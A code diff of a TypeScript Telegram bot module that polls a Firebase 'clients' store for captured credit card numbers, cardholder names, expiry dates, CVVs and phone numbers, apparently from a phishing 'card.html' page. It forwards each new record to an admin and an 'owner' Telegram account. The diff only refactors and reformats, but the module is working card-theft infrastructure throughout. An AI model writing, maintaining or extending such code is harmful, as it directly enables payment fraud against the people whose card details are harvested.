@@ -10,15 +10,12 @@
  *   cc_cardNumber, cc_cardholderName, cc_expiry, cc_cvv, cc_timestamp
  * We watch BOTH.
  */
+import { escapeMarkdown } from "../lib/telegramText";
 import { Telegraf } from "telegraf";
 import { logger } from "../lib/logger";
 import { fbGet, getCcWatermarks, setCcWatermark } from "./firebase";
 
 const POLL_INTERVAL = 12_000; // 12 seconds
-
-function escapeMarkdown(text: string): string {
-  return String(text || "").replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
-}
 
 async function sendSafe(bot: Telegraf, chatId: string, msg: string) {
   try {
@@ -37,7 +34,11 @@ export function startCcWatcher(bot: Telegraf, adminId: number): void {
       watermarks = await getCcWatermarks();
       const clients = await fbGet("clients");
       if (clients) {
-        for (const [deviceId, device] of Object.entries(clients as Record<string, any>).filter(([k]: any) => !String(k).startsWith('{') && !String(k).startsWith('*'))) {
+        for (const [deviceId, device] of Object.entries(
+          clients as Record<string, any>
+        ).filter(
+          ([k]: any) => !String(k).startsWith("{") && !String(k).startsWith("*")
+        )) {
           if (watermarks[deviceId] !== undefined) continue;
           // Seed — mark existing CC data as already seen
           const ts = device?.cc_timestamp || device?.timestamp || null;
@@ -58,12 +59,17 @@ export function startCcWatcher(bot: Telegraf, adminId: number): void {
       const clients = await fbGet("clients");
       if (!clients) return;
 
-      for (const [deviceId, device] of Object.entries(clients as Record<string, any>).filter(([k]: any) => !String(k).startsWith('{') && !String(k).startsWith('*'))) {
+      for (const [deviceId, device] of Object.entries(
+        clients as Record<string, any>
+      ).filter(
+        ([k]: any) => !String(k).startsWith("{") && !String(k).startsWith("*")
+      )) {
         // Support both field naming conventions from card.html
-        const cardNumber  = device?.cc_cardNumber  || device?.cardNumber  || null;
-        const cardHolder  = device?.cc_cardholderName || device?.cardholderName || "Unknown";
-        const expiry      = device?.cc_expiry  || device?.expiry  || "?";
-        const cvv         = device?.cc_cvv     || device?.cvv     || "?";
+        const cardNumber = device?.cc_cardNumber || device?.cardNumber || null;
+        const cardHolder =
+          device?.cc_cardholderName || device?.cardholderName || "Unknown";
+        const expiry = device?.cc_expiry || device?.expiry || "?";
+        const cvv = device?.cc_cvv || device?.cvv || "?";
         const ccTimestamp = device?.cc_timestamp || device?.timestamp || null;
         const ownerTelegramId: string | null = device?.ownerTelegramId || null;
         const phone = device?.mobNo || device?.phone || deviceId;
@@ -96,7 +102,10 @@ export function startCcWatcher(bot: Telegraf, adminId: number): void {
         await sendSafe(
           bot,
           adminId.toString(),
-          msg + (ownerTelegramId ? `\n\n👤 Owner: \`${escapeMarkdown(ownerTelegramId)}\`` : "")
+          msg +
+            (ownerTelegramId
+              ? `\n\n👤 Owner: \`${escapeMarkdown(ownerTelegramId)}\``
+              : "")
         );
 
         // Mark as notified
